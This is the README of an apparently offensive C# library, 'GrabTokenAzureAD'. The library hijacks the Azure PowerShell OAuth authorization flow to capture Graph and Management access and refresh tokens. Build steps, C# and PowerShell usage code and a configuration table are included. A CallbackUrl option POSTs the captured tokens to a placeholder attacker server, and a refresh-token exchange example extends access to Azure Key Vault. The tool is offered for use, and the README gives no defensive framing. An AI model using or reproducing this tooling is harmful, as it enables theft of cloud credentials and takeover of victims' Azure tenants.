# GrabTokenAzureAD

C# DLL that automates the Azure PowerShell authorization flow to capture OAuth tokens.

Based on: https://www.init1security.com/post/hijacking-azure-powershell-authentication-flow

## Build

```bash
dotnet build -c Release
```

Output: `bin/Release/netstandard2.0/GrabTokenAzureAD.dll` (or `net48`)

## Usage

### Basic Usage

```csharp
using GrabTokenAzureAD;

var config = new GrabberConfig
{
    ClientId = "1950a258-227b-4e31-a9cf-717495945fc2",  // Azure PowerShell
    Tenant = "common",
    RedirectUri = "http://localhost:8400",
    CallbackUrl = "https://your-server.com/capture"  // Optional
};

using var grabber = new AzureTokenGrabber(config);
grabber.OnStatus += (s, msg) => Console.WriteLine($"[*] {msg}");

var result = await grabber.GrabTokensAsync();

if (result.Success)
{
    Console.WriteLine($"Graph Token: {result.GraphToken.AccessToken}");
    Console.WriteLine($"Management Token: {result.ManagementToken?.AccessToken}");
}
```

### PowerShell (Add-Type)

```powershell
Add-Type -Path "GrabTokenAzureAD.dll"

$config = [GrabTokenAzureAD.GrabberConfig]::new()
$config.Tenant = "your-tenant.onmicrosoft.com"
$config.CallbackUrl = "https://your-server.com/capture"

$grabber = [GrabTokenAzureAD.AzureTokenGrabber]::new($config)
$result = $grabber.GrabTokensAsync().GetAwaiter().GetResult()

if ($result.Success) {
    $result.GraphToken.AccessToken
    $result.ManagementToken.AccessToken
}

$grabber.Dispose()
```

### Refresh Token Exchange

```csharp
// Exchange refresh token for different resource
var vaultToken = await grabber.ExchangeRefreshTokenAsync(
    result.GraphToken.RefreshToken,
    "https://vault.azure.net/.default"
);
```

## Configuration

| Property | Default | Description |
|----------|---------|-------------|
| `ClientId` | Azure PowerShell ID | OAuth client ID |
| `Tenant` | `common` | Azure AD tenant |
| `RedirectUri` | `http://localhost:8400` | OAuth redirect URI |
| `GraphScope` | `offline_access https://graph.microsoft.com/.default` | Initial scope |
| `ManagementScope` | `https://management.azure.com/.default` | Secondary scope |
| `CallbackUrl` | `null` | Server to POST captured tokens |
| `ListenerTimeoutSeconds` | `300` | HTTP listener timeout |

## Events

- `OnStatus` - Status messages during flow
- `OnTokenCaptured` - Fired when each token is obtained
